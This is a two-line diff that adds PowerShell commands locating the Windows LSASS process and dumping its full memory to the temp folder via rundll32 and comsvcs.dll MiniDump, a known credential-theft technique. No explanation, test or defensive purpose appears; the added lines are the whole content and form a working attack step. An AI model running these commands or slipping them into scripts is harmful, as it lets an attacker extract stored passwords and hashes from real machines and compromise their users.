@@ -1,0 +1,2 @@
+$LsassPid = (Get-Process lsass).Id
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $LsassPid $env:TEMP\lsass.dmp full
